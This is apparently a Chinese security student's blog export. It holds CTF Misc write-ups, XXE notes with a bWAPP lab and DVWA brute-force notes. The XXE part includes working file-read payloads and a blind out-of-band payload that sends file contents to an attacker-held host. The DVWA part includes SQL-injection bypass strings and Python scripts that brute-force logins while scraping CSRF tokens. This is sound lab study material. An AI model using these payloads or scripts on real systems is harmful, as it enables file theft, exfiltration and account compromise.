    <content type="text"><![CDATA[准备学学CTF了。先从一些基础题开始，做做Bugku、实验吧一些线上平台的Misc、Web题目，边学边做，顺便水水博客，就当做学习笔记了。 前言准备刷下Bugku上的Misc题。总结下规律(常见套路)。之后对其他平台其他题也会做做写写。 Misc基础加解题思路这里就不瞎搬了，直接给链接吧。CTF解题技能之MISC基础。这篇文章应该讲的还是挺清楚的(反正我是看这篇开始的)。 BugKu Misc WP基本知识可参看上面链接，接下来就开始写WP了。 0x01 这是一张简单的图片点进题目去，发现是一张jpg图片。Misc题目中，遇到图片，首先用winhex、Ultraedit等十六进制查看器查看。看看其中有没有隐藏什么信息，一般主要在文件尾藏信息。 比如这题，用Ultraedit查看，可以看到，文件尾部有下图所示数据。很明显，是html实体编码。于是解码得flag 0x02 隐写点进题目进去，是一个rar文件，解压后得到一个PNG文件按照惯例，UE查看一下十六进制，发现没有什么异常数据，于是扔到binwalk跑一下，看看有没有别的隐藏文件。看到有两个zlib文件，想着用dd命令提取出来就行了。但是提出了解压不了。再联想到题目名字叫隐写，应该flag在图片里，图片被做了手脚。于是找了一下这题的wp，看看别人怎么做的。得到如下结论： 用16进制编辑工具更改图片的高度，会只显示图片的一部分，下面的部分就被隐藏了，是个藏东西的好办法 PNG文件结构中的IHDR数据块包含有PNG文件中存储的图像数据的基本信息。 于是用UE修改PNG的高度,生成新图片新图片如下 0x03 telnet看题目名字telnet，大约能估计出来应该是个流量分析题。果不其然，点进题目下载zip文件后，解压得到pcap文件。用wireshark打开,然后找flag，自己做的时候是一个个报文找过去的，有点难受，所以特此附上流量分析wireshark常用操作快速找到flag方法右键wireshark，追踪TCP流 0x04 眼见非实(ISCCCTF)点进题目后，下载得到一个名字叫zip没有后缀的文件。 此时可用UE等查看其文件头确认其文件类型，手动添加后缀。附上常见文件文件头 或者扔进linux里面(linux里面文件没有所谓后缀名)，用file命令查看。 得到结果为，这是一个zip文件。在windows下面添加后缀，解压出来得到一个打不开的docx文件。一个打不开的docx文件，猜想可能不是docx文件。于是按上面流程再走一遍，发现这个docx文件也是个zip文件，再次解压得到一个文件夹，里面包含一些xml文件。结构如下图然后查找flag。面对这么多文件查找，这个时候就要通过linux grep命令了。 0x05 啊哒点进题目，下载一个zip文件。解压得到一张图片。对于图片的处理，上面几题已经说得差不多了，走流程下来后，将图片扔进binwalk里，发现里面包含一个zip文件。用dd命令提取隐藏的zip包出来并解压，可以看到这个提取出来的zip包里面包含flag.txt，但解密需要密码。 压缩包解密需要密码应该是一种Misc常见题型。于是上网搜索一圈，发现好像都太复杂，跟这个题目不合(后面做多了应该会遇到吧)。实在没办法，于是上网搜别人的wp，看怎么解决。 原来密码藏在的开始的ada.jpg图片的详细信息中，将这串字符当密码输一遍发现不对。于是进行变形，将这串字符进行解密。最后将这串字符转成ascii码，得到密码:sdnisc_2018输入密码解压后得到flag 0x06 又一张图片，还单纯吗点进题目，下载一张jpg图片。用binwalk跑一下，得到下面信息:可以看到，里面包含了多个图片文件，此时就用到foremost工具了语法：foremost &lt;filename&gt; [-o &lt;outputdir&gt;]提取成功后，得到flag图片 总结先写到这吧，后面陆续再更…]]></content>
      <categories>
        <category>CTF</category>
        <category>Bugku</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE学习]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FXXE%2FXXE%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[学习XXE过程中的一些笔记，内容包括XXE的前置知识 XML、DTD等，以及bWapp中XXE的漏洞利用实验 前言本来是想了解一下SSRF的，结果找到讲bWapp的SSRF的博客，里面有一个关于XXE的SSRF，索性就先把XXE看一下。参考链接: XXE前置知识 bWapp之XXE XXE和XML、DTD先分别说一下这三个词的概念吧 XXEXXE全称XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，肯定要先了解XML语法规则和外部实体的定义及调用形式。 DTDDTD全称Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 XMLXML 指可扩展标记语言，被设计用来传输和存储数据。 学习链接关于XML跟DTD的语法规则，我也是才看，还是不多说了，直接给教程链接吧。其中DTD的实体声明重点看XML教程DTD教程 基本Payload结构123456&lt;?xml version="1.0" encoding="UTF-8"?&gt; //xml声明&lt;!DOCTYPE miracle [ //DTD部分 &lt;!ELEMENT miracle ANY &gt; //元素类型声明 &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt; //实体声明里的外部实体声明&lt;miracle&gt;&amp;xee;&lt;/miracle&gt; //XML部分 DTD实体声明上述Payload分析稍微对linux有点了解的，看到上面的Payload结构中的DTD部分外部实体声明即&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;这一句就应该猜到这个Payload的作用了吧。没错，这个Payload的作用是输出目标服务器(服务器若为Linux)的passwd文件。那如果想用XXE漏洞进行一些别的操作，如:内网探测、内网入侵该怎么办呢？那就要讲到DTD实体声明了。 实体声明又分为内部实体声明、外部实体声明、参数实体声明等。这里就只讲外部实体声明、参数实体声明吧 DTD外部实体声明DTD外部实体声明语法:&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;引用方式: &amp;实体名 外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下图所示:示例:12345&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; DTD参数实体声明语法:&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt; 或 &lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;引用方式:%实体名示例:1234&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; 外部evil.dtd内容为:&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; XXE的利用方式-DTDXXE作用利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议http等进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做了 XXE分类一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。 有回显情况有回显的情况可以使用如下的两种方式进行XXE注入攻击，也就是上面讲到的DTD外部实体声明和参数实体声明。方式一:12345&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; 方式二：123456&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; 外部evil.dtd内容为:&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; 无回显情况可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。123456&lt;!DOCTYPE updateProfile [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd"&gt;%dtd;%send;]&gt; evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。注意此处的参数实体声明语法格式是:&lt;!ENTITY % 实体名称 &quot;值&quot;&gt;1234&lt;!ENTITY % all"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'&gt;"&gt;%all; 这里执行完查看结果分两种情况: 有报错有报错信息的话，直接查看错误信息有没有目标文件源码的base64 没有报错没有报错的话，查看被发送机(自己的主机且具有公网IP)的访问日志。 还有bWapp中的xxe利用，待更··· 2019/03/27 更 bWapp里的XXE实验0x01 进入bWapp，选择XXE漏洞环境 打开bWapp虚拟机,未安装参考BWAPP：一款非常好用的漏洞演示平台进行安装 使用账户:bee 密码:bug进行登录，并选择安全级别为low 登录后选择XXE漏洞环境,点击hack 成功进入到XXE漏洞环境 0x02 抓包分析 打开Burp，设置好浏览器代理，点击Any bugs?，查看抓包结果 对抓包结果分析，如上图所划线处，可以看到xxe-1.php页面以POST方式向xxe-2.php提交xml数据 0x03 构造payloadspayload:12345678&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE miracle [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any Bugs?&lt;/secret&gt;&lt;/reset&gt; 0x04 使用Burp repeater提交payloads 0x05 源码分析 先放源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107&lt;?phpinclude("security.php");include("security_level_check.php");include("connect_i.php");$message = "";$body = file_get_contents("php://input");// If the security level is not MEDIUM or HIGHif($_COOKIE["security_level"] != "1" &amp;&amp; $_COOKIE["security_level"] != "2")&#123; ini_set("display_errors",1); $xml = simplexml_load_string($body); // Debugging // print_r($xml); $login = $xml-&gt;login; $secret = $xml-&gt;secret; if($login &amp;&amp; $login != "" &amp;&amp; $secret) &#123; // $login = mysqli_real_escape_string($link, $login); // $secret = mysqli_real_escape_string($link, $secret); $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'"; // Debugging // echo $sql; $recordset = $link-&gt;query($sql); if(!$recordset) &#123; die("Connect Error: " . $link-&gt;error); &#125; $message = $login . "'s secret has been reset!"; &#125; else &#123; $message = "An error occured!"; &#125;&#125;// If the security level is MEDIUM or HIGHelse&#123; // Disables XML external entities. Doesn't work with older PHP versions! // libxml_disable_entity_loader(true); $xml = simplexml_load_string($body); // Debugging // print_r($xml); $login = $_SESSION["login"]; $secret = $xml-&gt;secret; if($secret) &#123; $secret = mysqli_real_escape_string($link, $secret); $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'"; // Debugging // echo $sql; $recordset = $link-&gt;query($sql); if(!$recordset) &#123; die("Connect Error: " . $link-&gt;error); &#125; $message = $login . "'s secret has been reset!"; &#125; else &#123; $message = "An error occured!"; &#125;&#125;echo $message;$link-&gt;close();?&gt; 如下图,若安全级别为low的话，就从xml传输的数据中取出值来赋给login login再拼接成message message直接输出,所以存在XXE漏洞，利用login进行我们想要的操作并回显 在源码中也能看到，对于中高级别，login从Session中获取，secret从xml获取后也用 mysqli_real_escape_string函数进行了特殊字符转义。 总结本来还想写一下jarvis oj上一个xxe的例子，后面想想还是留到后面写刷jarvis题目的时候在写吧。XXE就学到这里吧(更深的现在也找不到例子学不来，2333，以后再深入吧)，过几天把SSRF简单学习总结一下。]]></content>
      <categories>
        <category>Web安全</category>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之暴力破解]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FDVWA%2F%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%2Fdvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.html</url>
    <content type="text"><![CDATA[针对DVWA里的暴力破解漏洞进行实验测试。主要内容包括BurpSuite的一些Intruder模块的基本使用和简单的python脚本编写。 简介搞Web安全和渗透的，估计都玩过Dvwa这个靶机。所以关于Dvwa就不说了。直接进入主题吧 Brute Force,即暴力(破解),是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击 话不多说，下面就针对Dvwa中暴力破解模块的不同级别进行分析测试吧。 Low级别先来看源码1234567891011121314151617181920212223242526272829303132&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，对于登录的处理，服务器只是验证参数Login是否被设置，并没有任何的防爆破机制。因此可以通过BurpSuite进行爆破。if( isset( $_GET[ &#39;Login&#39; ] ) ) 此外对参数username、password等也没做任何过滤处理。因此此处还存在SQL注入漏洞，可以使用万能密码绕过，在用户名处输入admin&#39;#或者admin&#39; or &#39;1&#39;=&#39;1即可登录。 使用Burp进行爆破 打开Burp，记得设置浏览器代理。 进行抓包浏览器设置好代理后，点击Login按钮，可以看到Burp成功抓包 抓到包后，按ctrl+l键，或者右键选择send to Intruder 因为是要对password参数进行爆破，所以只在password参数内容两边加$ 设置好要爆破的参数后，选择Payloads模块设置字典。可以使用Burp自带的简单字典，或者自己去网上下载构造。因为此处Burp自带的字典里没有password(正确密码)，故我们手动加入进去 设置攻击字典后，设置爆破线程暴力破解是一个穷举的过程，速度很慢，故可以通过多线程加快速度。但Burp社区版不提供增加线程功能，我用的是Burp pro破解版将线程设为50个，然后点击start attack开始爆破 上一步点击开始爆破后，会切换到一个爆破任务详情新窗口在分析爆破结果前，先讲一下原理(感觉太啰嗦了，麻烦且累以后还是不写这么详细好了)我们分别通过万能密码和错误的密码成功登陆和失败登陆，如下两图可以看到，返回的信息是不同的，所以响应包的长度Length也不一样 因此，在爆破任务详情窗口可以通过Length进行筛选选出Length “与众不同”的payload即为密码 Medium级别贴上源码1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed sleep( 2 ); echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，相比low级别的代码，这里主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号进行转义，基本上能抵御SQL注入攻击。但对登录并没做什么防护，因此跟Low级别一样，使用Burp进行爆破即可。 High级别贴上源码1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Check database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; ###分析High级别的代码加入了随机token，可以抵御CSRF攻击，但同时增加了爆破的难度。虽然不能用Burp爆破，但可以用python jio脚本呀先抓一下包分析一下请求可以看到，每次服务器返回的登录页面都会生成一个随机的user_token,用户每次登陆时都要将user_token一起提交，服务器每次收到请求后，也都会先做token的检查，再进行sql查询 脚本编写思路每次用python登录之前，先用python访问登录页面通过BeautifulSoup将user_token抓取出来。抓出来之后拼接url进行登录。我写了两个脚本，原理都差不多，不过是第二个用了requests库中的Session方法。 实现好了，不多bb，开始写吧 先贴代码1234567891011121314151617181920212223242526272829303132333435363738394041#Version:python3#coding=utf-8#Author:Miracle778from bs4 import BeautifulSoupimport urllib3import requestsheader = &#123; 'Host':'127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer':'http://127.0.0.1/vulnerabilities/brute/', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'zh-CN,zh;q=0.9', 'Cookie':'Pycharm-ae03759a=6fdf0374-3228-456b-ae40-07e2c178708e;PHPSESSID=3b23u5l2qlg5nmedn4ebrltbg6;security=high', 'Connection':'close'&#125;requrl = 'http://127.0.0.1/vulnerabilities/brute/'def get_token(requrl,header): req = requests.get(url=requrl,headers=header) response = req.text soup = BeautifulSoup(response,'html.parser') user_token = soup.form.find_all(name='input')[-1]['value'] return user_token#爆10次i = 0user_token= get_token(requrl,header)for line in open("passwd.txt"): url = requrl + '?username=admin&amp;password=' + line.strip() \ + '&amp;Login=Login&amp;user_token=' + user_token i = i+1 req = requests.get(url,headers=header) status_code = req.status_code length = len(req.text) print(i,'admin',line.strip(),status_code,length) user_token = get_token(requrl,header) if i==10: break 12345678910111213141516171819202122232425262728293031323334#Version:python3#coding=utf-8#Author:Miracle778import requestsfrom bs4 import BeautifulSoups = requests.Session()header = &#123; 'Host':'127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer':'http://127.0.0.1/vulnerabilities/brute/', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'zh-CN,zh;q=0.9', 'Cookie':'Pycharm-ae03759a=6fdf0374-3228-456b-ae40-07e2c178708e;PHPSESSID=3b23u5l2qlg5nmedn4ebrltbg6;security=high', 'Connection':'close'&#125;s.headers = headerrequrl = 'http://127.0.0.1/vulnerabilities/brute/'def get_token(requrl): req = s.get(requrl) soup = BeautifulSoup(req.text,'html.parser') user_token = soup.form.find_all(name='input')[-1]['value'] return user_tokenfor line in open("passwd.txt"): user_token = get_token(requrl) url = requrl + '?username=admin&amp;password=' + line.strip() \ + '&amp;Login=Login&amp;user_token=' + user_token reponse = s.get(url) status_code = reponse.status_code length = len(reponse.text) print('admin',line.strip(),status_code,length) 编写中注意的点先用浏览器F12一下，找出user_token所在标签理清结构后使用BeautifulSoup进行提取(可以用一些爬虫插件、或者直接用python解释器测试)得到BeautifulSoup提取语句：user_token = soup.form.find_all(name=&#39;input&#39;)[-1][&#39;value&#39;] 设置header要注意，不然脚本无效因为这个实验测试是之前做的，写文章的时候复现时发现，header不对的话脚本无效说一下设置header的方法吧。 用Burp抓一下包,然后照着结果设置header。此处应有个笑哭的emoji 效果 Impossible级别这个不怎么好写，就不写了 总结想起之前看别人博客学习的时候，别人写的太简洁了而自己知识面不够广，导致自己学习的时候一脸懵。那种自闭的感觉很容易消磨学习的兴趣。所以自己刚开始写Blog，就总想着写得详细。但写得详细的话，太费时间了。所以之后看情况写吧，一些太啰嗦的东西就懒得贴上来了。]]></content>
      <categories>
        <category>Web安全</category>
        <category>DVWA</category>
        <category>暴力破解</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>burpsuite</tag>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo中插入pdf解决方法]]></title>
    <url>%2Fpdf-test%2Fpdf-test.html</url>
    <content type="text"><![CDATA[搭好hexo博客后，想着把之前上课的实验弄上去，博客放实验报告，github放代码。互为参考。但word转成md文件太过麻烦。于是就想着直接把pdf放上来,网上搜一圈，发现都是说装一个叫 “hexo-pdf”的插件就行了。不知道是不是插件过时了还是我哪里出了问题，反正我用的时候pdf就死活出不来，于是自己瞎鸡儿琢磨了一个简单粗暴的方法，记录一下。 首先修改_config.yml文件将_config.yml中的post_asset_folder选项置为truepost_asset_folder: true 关于这个选项的功能说明如下: 当您设置post_asset_folder为true参数后，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到那个文件夹，如此一来，您便可以更方便的使用资源。 然后新建一篇文章$ hexo new &lt;article name&gt; 由于上一步已经将post_asset_folder选项设为了true所以这一步新建文章时会创建一个md文件和一个同名的文件夹为了方便叙述，我用test作为文件和文件夹名 编辑test&#x2E;md 用vim或者别的编辑器打开test&#x2E;mdtest&#x2E;md文件中加入如下代码&lt;object data=&quot;./test/test.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;关于这句代码简单的解释data表示你要上传的pdf的路径,使用相对路径，将你要上传的pdf放入第二步生成的test文 件夹type和width就不说了，这里注意height不能设成100%，不然太矮了，显示效果不好可以用浏览器预览，通过F12预估一下高度。我最后代码如下，供参考&lt;object data=&quot;./test/test.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;877px&quot;&gt; 这里不一定非用object标签，embed、iframe标签也一样具体参考:网页链接 效果此处上传一个测试pdf 总结今天刚看完markdown语法，难免想多写几篇blog练一练。其实今天发文章插图片的时候，插了好久才成功，不知道是什么原因，搞了好久。最后仔细看了看Git执行 $ hexo g输出信息中的生成的图片路径才有点眉目。直接打开hexo-asset-image插件的源码(在node_modules目录下)，原来是hexo-asset-image这个插件对图片路径名的处理函数跟我的输入路径对不上。所以会把我的图片路径转换错，所以一直访问不到。虽然js代码不会写，改不了插件源码，但我会看呀，把自己的图片路径输入格式按照它处理的那样输，最后成功解决。本来想记录一下再水一篇blog的，但后面懒的记了另外如果pdf插不成功的话，记得看一下$ hexo g的输出信息有没有生成pdf静态文件，然后检查检查路径 解决了pdf嵌入问题的话 那过几天就可以把我之前的实验报告弄上去了还记得上学期用pyqt做的端口扫描器跟注册表编辑器还有一些python网络编程写的辣鸡聊天室、辣鸡异步服务器等等还有密码学几个MFC写的辣鸡算法(不知道多久的以后应该会用python、Go重构一下)还有这学期会做几个信息隐藏的算法，辣鸡图片隐写术可能也会来瞎研究的一些Web安全、渗透方面的东西估计也会写一写 ···一大波辣鸡代码正在路上···]]></content>
      <categories>
        <category>pdf-test</category>
      </categories>
      <tags>
        <tag>hexo 插入pdf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown-study]]></title>
    <url>%2FStudy%2Fmarkdown%2Fmarkdown-study.html</url>
    <content type="text"><![CDATA[在Hexo上写文章肯定要回markdown，于是对着官方文档过了一遍，用的是VS code加Markdown Preview Enhanced插件，源码会放在最后。 中文文档地址 : https://markdown-zh.readthedocs.io/en/latest/ 标题现在听的歌王菲 - 我也不想这样段落This is a regular paragraph html里块级跟非块级标签不同用法,块级标签里面不能用md语法 Foo bar #块级元素里用md语法 无效 This is another regular paragraph html跟md语法的一些比较加粗体**text** 将text加粗，与&lt;b&gt;标签相似 加斜体span用处，组合行内元素，添加id class等属性 *text* md语法，表示斜体,与&lt;cite&gt;和&lt;em&gt;标签类似cite标签表示对文献的引用，为斜体一般和a标签一起用，链接到所参考位置 加删除线表示删除文本，html del标签md语法里用两条波浪线~表示 行尾加两个空格以上回车表示换行 标题两种表示方法第一种=、-文本下面加=表示一级标题，下面加-表示二级标题 第二种##的数量代表级数## 二级### 三级#### 四级 块级元素块引用 块引用，通过 >text声明 这是第一层 这是第二层 回到第一层 可以嵌套md语法 列表1 列表2 列表3 列表 无序列表 可用*、+、- 有序列表 使用数字加点如:1. Bird Magic 注释块 A list item with a blockquote: This is a blockquoteinside a list item. 代码块 A list item with a codeblock: def func(): print(&quot;hello Python!&quot;) 水平线用三个连着的字符(字符中间有空格不要紧，-，*，_) 内联元素内联链接中括号加括号[]()如:[miracle778’s Blog](https://miracle778.github.io) 显示如下miracle778’s Blog 引用链接两个中括号[ ][ ]This is [an example] [id] reference-style link.[id]: http://example.com/ “鼠标悬浮在id上显示的文字” 默认链接google 强调上面比较html跟md的时候有提到用单*或单_表示斜体，与&lt;em&gt;标签类似用双*或双_表示粗体,与&lt;strong&gt;标签类似 代码用 单`或三`，三`可以指定代码语言,如下1echo "hello bash"; 1echo "hello php"; 图片内联图片语法:![文件名](路径 “可选项:表示鼠标悬停显示信息”)如: 引用图片语法:![文件名][id] 其他自动链接语法:&lt;url&gt;http://miracle778.github.com 反斜杠转义常识，不写了 代码#标题 ## 现在听的歌 ### 王菲 - 我也不想这样 # 段落 This is a regular paragraph ## html里块级跟非块级标签不同用法,块级标签里面不能用md语法 &lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;td&gt;bar&lt;/td&gt; &lt;td&gt;#块级元素里用md语法 无效&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; This is another regular paragraph &lt;br /&gt;&lt;br /&gt; ## html跟md语法的一些比较 ### 加粗体 \*\*text** 将text加粗，与&amp;lt;b&gt;标签相似 ### 加斜体 &lt;span id=&quot;span&quot;&gt;span用处，组合行内元素，添加id class等属性&lt;/span&gt; &lt;br/&gt; \*text\* md语法，表示斜体,与&amp;lt;cite&amp;gt;和&amp;lt;em&gt;标签类似&lt;br/&gt; &lt;cite&gt; &lt;a&gt;cite标签表示对文献的引用，为斜体一般和a标签一起用，链接到所参考位置&lt;/a&gt; &lt;/cite&gt; ### 加删除线 &lt;del&gt;表示删除文本，html del标签&lt;/del&gt; ~~md语法里用两条波浪线\~表示~~ **行尾加两个空格以上回车表示换行** # 标题两种表示方法 *第一种=、-* 文本下面加=表示一级标题，下面加-表示二级标题 一级标题 ========== 二级标题 --------- *第二种#* \#的数量代表级数 ## 二级 ### 三级 #### 四级 # 块级元素 ## 块引用 &gt; 块引用，通过 \&gt;text声明 &gt; &gt; &gt; 这是第一层 &gt; &gt; &gt; &gt; 这是第二层 &gt; &gt; &gt; **回到第一层** &gt; # 可以嵌套md语法 &gt; 1. 列表1 &gt; 2. 列表2 &gt; 3. 列表3 ## 列表 - 无序列表 + 可用*、+、- * 有序列表 + 